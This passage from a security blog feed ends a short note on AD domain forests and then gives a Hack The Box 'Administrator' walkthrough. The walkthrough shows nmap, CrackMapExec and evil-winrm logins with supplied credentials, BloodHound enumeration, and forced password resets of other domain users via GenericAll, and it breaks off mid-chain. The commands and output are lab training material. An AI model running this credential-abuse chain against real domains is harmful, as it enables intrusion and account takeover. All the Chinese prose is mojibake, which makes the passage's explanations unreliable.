èƒ½çœ‹ä½†ä¸ä¸€å®šèƒ½æ‰§è¡ŒæˆåŠŸï¼ŒæœåŠ¡å™¨å¦‚æœæ²¡å¼€è¿™ä¸ªæœåŠ¡å°±ä¸èƒ½æ‰§è¡Œ</p><p>éœ€è¦å¯åŠ¨Computer BrowseræœåŠ¡ï¼Œä½†æ˜¯ è¿™ä¸ªå‘½ä»¤ä¼šå±•ç°å½“å‰æ‰€æœ‰çš„çˆ¶å­åŸŸï¼Œå¦‚ä½•åˆ¤æ–­å…·ä½“åœ¨é‚£ä¸ªåŸŸä¸­å‘¢ï¼Ÿ</p><p>whoamiçœ‹è´¦æˆ·å‰é¢çš„åŸŸåç§°</p><h4 id="3ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC"><a href="#3ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC" class="headerlink" title="3ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC"></a>3ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC</h4><p>åŒä¸Š </p><p>åŸŸå†…è¦æ³¨æ„dnsè§£æçš„é—®é¢˜</p><h4 id="4ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯"><a href="#4ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯" class="headerlink" title="4ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯"></a>4ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯</h4><p>åŸŸæ¸—é€åŸºç¡€å‘½ä»¤</p><p><a href="https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g">https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g</a></p><h3 id="åŸŸæ£®æ—-1"><a href="#åŸŸæ£®æ—-1" class="headerlink" title="åŸŸæ£®æ—"></a>åŸŸæ£®æ—</h3><p>åŸŸä¸åŸŸé…ç½®ä¿¡ä»»å…³ç³» </p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734590228218-1409a999-1ace-44bc-9c8a-3fefbc212cbf.png"></p><p>æ¼”ç¤ºï¼š</p><h4 id="1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…-1"><a href="#1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…-1" class="headerlink" title="1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…"></a>1ã€å¦‚ä½•åˆ¤æ–­åœ¨å•åŸŸå†…</h4><p>net view ä¸€ä¸ª</p><h4 id="2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…-1"><a href="#2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…-1" class="headerlink" title="2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…"></a>2ã€å¦‚ä½•åˆ¤æ–­åœ¨çˆ¶å­åŸŸå†…</h4><p>net view å¤šä¸ª</p><p>å…¶ä»–å‘½ä»¤è¿è¡Œæç¤ºå¤šä¸ªå­åŸŸ</p><h4 id="3ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ ‘æ—å†…"><a href="#3ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ ‘æ—å†…" class="headerlink" title="3ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ ‘æ—å†…"></a>3ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ ‘æ—å†…</h4><p>net view å¤šä¸ª</p><p>å…¶ä»–å‘½ä»¤è¿è¡Œæç¤ºå¤šä¸ªå­åŸŸ</p><h4 id="4ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ£®æ—å†…"><a href="#4ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ£®æ—å†…" class="headerlink" title="4ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ£®æ—å†…"></a>4ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸæ£®æ—å†…</h4><p>net view æ— è§„åˆ™</p><p>ç”¨æˆ·ä¸æœ¬æœºç”¨æˆ·ä¸ä¸€è‡´</p><p>åŸŸå†…ç”¨æˆ·åä¸åœ¨å½“å‰åŸŸ åœ¨å¦å¤–çš„åŸŸé‡Œé¢ å…¸å‹çš„åŸŸæ£®æ—</p><h4 id="5ã€åŸŸæ ‘å’ŒåŸŸæ—å¯¹æ¯”å‰é¢"><a href="#5ã€åŸŸæ ‘å’ŒåŸŸæ—å¯¹æ¯”å‰é¢" class="headerlink" title="5ã€åŸŸæ ‘å’ŒåŸŸæ—å¯¹æ¯”å‰é¢"></a>5ã€åŸŸæ ‘å’ŒåŸŸæ—å¯¹æ¯”å‰é¢</h4><h4 id="5ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC"><a href="#5ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC" class="headerlink" title="5ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC"></a>5ã€å¦‚ä½•å®šä½å½“å‰åŸŸæ§DC</h4><h4 id="6ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯"><a href="#6ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯" class="headerlink" title="6ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯"></a>6ã€å¦‚ä½•è·å–å½“å‰å…¶ä»–ä¿¡æ¯</h4><p>å…¶ä»–ä¿¡æ¯ï¼šç”¨æˆ·åŠç»„ï¼Œç½‘ç»œæ¶æ„ç­‰</p><p>æ‰‹å·¥å·¥å…·ï¼šå¸¸è§å‘½ä»¤ï¼Œå·¥å…·æ’ä»¶ç­‰</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb-Administrator</title>
      <link href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"/>
      <url>/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/</url>
      
        <content type="html"><![CDATA[<p>s is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedichç”¨æˆ·åï¼šOlivia<br>å¯†ç ï¼šichliebedich</p><p>nmap -sCV -A -T4 -Pn 10.10.11.42</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 15:42 CST</span><br><span class="line">Nmap scan report for 10.10.11.42</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-14 14:42:58Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=12/14%OT=21%CT=1%CU=42122%PV=Y%DS=2%DC=T%G=Y%TM=675</span><br><span class="line">OS:D375F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=RD%II=I%TS=</span><br><span class="line">OS:A)SEQ(SP=107%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=108</span><br><span class="line">OS:%TI=RD%CI=RD%II=I%TS=C)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11</span><br><span class="line">OS:%O4=M53ANW8ST11%O5=M53ANW8ST11%O6=M53AST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W</span><br><span class="line">OS:4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(</span><br><span class="line">OS:R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=</span><br><span class="line">OS:%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">OS:T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S</span><br><span class="line">OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC</span><br><span class="line">OS:K=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h00m04s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-12-14T14:44:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 23/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   768.22 ms 10.10.16.1</span><br><span class="line">2   359.07 ms 10.10.11.42</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 136.19 seconds</span><br></pre></td></tr></table></figure><p>ftpå°è¯•å¤±è´¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734162976598-e15a6716-76f3-460b-9a25-ef1a7755de1b.png"></p><h3 id="smbçˆ†ç ´"><a href="#smbçˆ†ç ´" class="headerlink" title="smbçˆ†ç ´"></a>smbçˆ†ç ´</h3><p>SMB æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œå…è®¸åº”ç”¨ç¨‹åºé€šè¿‡ç½‘ç»œè¯»å–å’Œå†™å…¥æ–‡ä»¶ã€è¯·æ±‚è¿œç¨‹æœåŠ¡ä»¥åŠè¿›è¡Œå…¶ä»–ç½‘ç»œæ“ä½œã€‚</p><p>åˆ©ç”¨æä¾›çš„è´¦å·å¯†ç ï¼Œä½¿ç”¨<code>CrackMapExec</code>å·¥å…·å¯¹<code>SMB æœåŠ¡</code>è¿›è¡Œæšä¸¾ï¼ŒéªŒè¯æä¾›çš„å‡­æ®æ˜¯å¦å¯ç”¨ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æœ‰ç”¨çš„å…±äº«ç›®å½•ã€‚</p><p>CrackMapExec æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œä¸»è¦ç”¨äº Windows ç½‘ç»œçš„æšä¸¾å’Œåˆ©ç”¨ã€‚å®ƒç‰¹åˆ«é€‚åˆå¯¹ SMBã€RDP å’Œ WinRM æœåŠ¡è¿›è¡Œå¹¿æ³›æ‰«æã€è®¤è¯ã€æ‰§è¡Œå‘½ä»¤å’Œæšä¸¾å…±äº«ç›®å½•ç­‰æ“ä½œ</p><p>ç»“æœæ˜¾ç¤ºï¼Œç”¨æˆ·<code>Olivia</code> çš„ SMB ç™»å½•æœ‰æ•ˆï¼Œä½†æœªå‘ç°æœ‰ç”¨çš„å…±äº«ç›®å½•ï¼Œä»…èƒ½è¯»å–å¸¸è§çš„<code>NETLOGON</code> å’Œ<code>SYSVOL</code></p><p>crackmapexec smb 10.10.11.42 -u â€˜Oliviaâ€™ -p â€˜ichliebedichâ€™ â€“shares</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163151310-eef8289b-a853-43e6-bd6a-bee65807651e.png"></p><h3 id="WinRM-ç™»å½•olivia"><a href="#WinRM-ç™»å½•olivia" class="headerlink" title="WinRM ç™»å½•olivia"></a><strong>WinRM ç™»å½•olivia</strong></h3><p>WinRM æ˜¯ Microsoft æä¾›çš„è¿œç¨‹ç®¡ç†åè®®ï¼Œå…è®¸è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€å¯åŠ¨è¿›ç¨‹ã€ç®¡ç†ç³»ç»Ÿè®¾ç½®ç­‰ï¼Œç±»ä¼¼äº Unix ç³»ç»Ÿä¸­çš„ SSH</p><p>ä½¿ç”¨ CrackMapExec éªŒè¯ç›®æ ‡ä¸»æœºçš„<code>WinRM æœåŠ¡</code>ï¼ˆç«¯å£ 5985ï¼‰ï¼Œå‘ç°å‡­æ®æœ‰æ•ˆå¹¶æˆåŠŸç™»å½•ã€‚</p><p>è¿”å›ç»“æœè¡¨æ˜å¯ä»¥é€šè¿‡ WinRM è·å–è¿œç¨‹è®¿é—®æƒé™</p><p>crackmapexec winrm 10.10.11.42 -u â€˜Oliviaâ€™ -p â€˜ichliebedichâ€™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163334873-7aa7887c-79a3-46b4-b875-a595a6cd1e94.png"></p><p>ä½¿ç”¨<code>evil-winrm</code>ç™»å½•ï¼Œä½¿ç”¨<code>evil-winrm</code> è¿›ä¸€æ­¥è·å–ç›®æ ‡ä¸»æœºçš„æƒé™å’Œç”¨æˆ·ä¿¡æ¯</p><p>å¹¶ä¸”é€šè¿‡è¿è¡Œ<code>whoami /all</code> å‘½ä»¤æŸ¥çœ‹ç”¨æˆ·æƒé™</p><p>evil-winrm -i 10.10.11.42 -u â€˜Oliviaâ€™ -p â€˜ichliebedichâ€™</p><p>å¹¶ä¸”é€šè¿‡è¿è¡Œ<code>whoami /all</code> å‘½ä»¤æŸ¥çœ‹ç”¨æˆ·æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~]</span><br><span class="line">â””â”€# evil-winrm -i 10.10.11.42 -u &#x27;Olivia&#x27; -p &#x27;ichliebedich&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name            SID</span><br><span class="line">==================== ============================================</span><br><span class="line">administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                  Type             SID          Attributes</span><br><span class="line">=========================================== ================ ============ ==================================================</span><br><span class="line">Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; </span><br></pre></td></tr></table></figure><p>ç»“æœå‘ç°<code>Olivia</code> ç”¨æˆ·å…·æœ‰åŸºæœ¬çš„æ“ä½œæƒé™ï¼Œå¹¶ä¸”æ‹¥æœ‰<code>SeMachineAccountPrivilege</code>ï¼Œå…è®¸å…¶å°†è®¡ç®—æœºå¸æˆ·æ·»åŠ åˆ°åŸŸä¸­ã€‚</p><h3 id="åŸŸç”¨æˆ·çˆ†ç ´"><a href="#åŸŸç”¨æˆ·çˆ†ç ´" class="headerlink" title="åŸŸç”¨æˆ·çˆ†ç ´"></a>åŸŸç”¨æˆ·çˆ†ç ´</h3><p>æˆåŠŸç™»å½•ç›®æ ‡ä¸»æœºåï¼Œä½¿ç”¨<code>net user</code> å‘½ä»¤å¯¹åŸŸå†…çš„ç”¨æˆ·è¿›è¡Œæšä¸¾ã€‚åˆ—å‡ºå½“å‰åŸŸæ§åˆ¶å™¨ä¸Šå­˜åœ¨çš„æ‰€æœ‰ç”¨æˆ·è´¦æˆ·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            alexander                benjamin</span><br><span class="line">emily                    emma                     ethan</span><br><span class="line">Guest                    krbtgt                   michael</span><br><span class="line">olivia</span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure><p><code>olivia</code>ä¸ºå½“å‰ä½¿ç”¨çš„ç”¨æˆ·ï¼Œå…¶ä½™ä¸ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·</p><h3 id="è·å–æƒé™"><a href="#è·å–æƒé™" class="headerlink" title="è·å–æƒé™"></a>è·å–æƒé™</h3><h4 id="BloodHound-æå–åŸŸä¿¡æ¯"><a href="#BloodHound-æå–åŸŸä¿¡æ¯" class="headerlink" title="BloodHound æå–åŸŸä¿¡æ¯"></a>BloodHound æå–åŸŸä¿¡æ¯</h4><p>ä½¿ç”¨å·¥å…·<code>bloodhound.py</code>ä»åŸŸä¸­æå–ä¿¡æ¯</p><p>BloodHoundå·¥å…·é“¾æ¥ï¼š<a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">â””â”€# bloodhound-python  -d administrator.htb -ns 10.10.11.42 -u &#x27;Olivia&#x27; -p ichliebedich -c All --zip</span><br><span class="line">INFO: Found AD domain: administrator.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes</span><br><span class="line">INFO: Connecting to LDAP server: dc.administrator.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.administrator.htb</span><br><span class="line">INFO: Found 11 users</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.administrator.htb</span><br><span class="line">WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.42:445)] timed out</span><br><span class="line">WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.</span><br><span class="line">INFO: Done in 01M 14S</span><br><span class="line">INFO: Compressing output into 20241214163637_bloodhound.zip</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ­¤å‘½ä»¤åï¼Œæˆ‘ä»¬è·å¾—äº†å‹ç¼©åŒ…<code>20241214163637_bloodhound.zip</code>ï¼Œå®ƒåŒ…å«äº†åŸŸä¸­çš„æ‰€æœ‰å…³é”®ä¿¡æ¯ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>sudo neo4j start</code>å‘½ä»¤å¯åŠ¨æ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨<code>bloodhound</code>å‘½ä»¤è¿›å…¥å·¥å…·ã€‚å°†å¾—åˆ°çš„zipå‹ç¼©åŒ…æ‹–å…¥åˆ°Bloodhoundä¸­ä¸Šä¼ æ–‡ä»¶ã€‚è´¦å·neo4j å¯†ç 123456</p><p>æˆ‘ä»¬å½“å‰ç”¨æˆ·ä¸º<code>Olivia</code>ï¼Œå› æ­¤æŸ¥çœ‹ä¸€ä¸‹èŠ‚ç‚¹ä¿¡æ¯ï¼Œå·¦ä¸Šè§’æœç´¢Oliviaï¼Œoliviaæœ‰ä¸€ä¸ª<code>First Degreee object control</code>(ä¸€çº§å¯¹è±¡æ§åˆ¶ï¼Œæ¥ä¸‹æ¥ç®€ç§°FDOC)ï¼Œç‚¹å‡»å®ƒå¯ä»¥çœ‹åˆ°oliviaå¯¹ç”¨æˆ·michaelæ‹¥æœ‰<code>GenericAllæƒé™</code>ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168252003-eb4fd5bf-abcd-403b-a19e-b0a6c26f8934.png"></p><h4 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h4><h5 id="Olivia-michael"><a href="#Olivia-michael" class="headerlink" title="Olivia-&gt;michael"></a>Olivia-&gt;michael</h5><p>GenericAll æƒé™ç›¸å½“äºâ€œå®Œå…¨æ§åˆ¶â€æƒé™ï¼Œæ„å‘³ç€ olivia å¯ä»¥å®Œå…¨æ§åˆ¶ michael ç”¨æˆ·ï¼ŒåŒ…æ‹¬ä¿®æ”¹å¯†ç å’Œç»„æˆå‘˜ç­‰æ“ä½œã€‚</p><p>ä½¿ç”¨<code>evil-winrm</code>ç™»å½•<code>olivia</code>ç”¨æˆ·ï¼Œä¿®æ”¹åŸŸå†…ç”¨æˆ·<code>michael</code>çš„å¯†ç ä¸º<code>michael</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; net user michael michael /domain </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»å½•ï¼Œæ‹¿ä¸‹<code>michael</code>ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/HTB/Administrator]</span><br><span class="line">â””â”€# evil-winrm -i 10.10.11.42 -u &#x27;michael&#x27; -p &#x27;michael&#x27;</span><br><span class="line">*Evil-WinRM* PS C:\Users\michael\Documents&gt; whoami</span><br><span class="line">administrator\michael</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168422913-bead28a8-64b4-41e3-897a-32cccbfbd8d7.png"></p><h5 id="michael-benjamin"><a href="#michael-benjamin" class="headerlink" title="michael-&gt;benjamin"></a>michael-&gt;benjamin</h5><p>ForceChangePassword</p><p>æ‰“å¼€bloodhoundï¼ŒæŸ¥çœ‹<code>michael</code>ç”¨æˆ·ï¼Œå‘ç°è¯¥ç”¨æˆ·ä¹Ÿæœ‰ä¸€ä¸ªFDOCï¼Œå¹¶ä¸”è¯¥FDOCå¯¹<code>benjamin</code>ç”¨æˆ·å…·æœ‰<code>ForceChangePassword</code>æƒé™ï¼Œå³å¯ä»¥å¼ºåˆ¶æ›´æ”¹<code>benjamin</code>çš„å¯†ç ã€‚</p><p><img 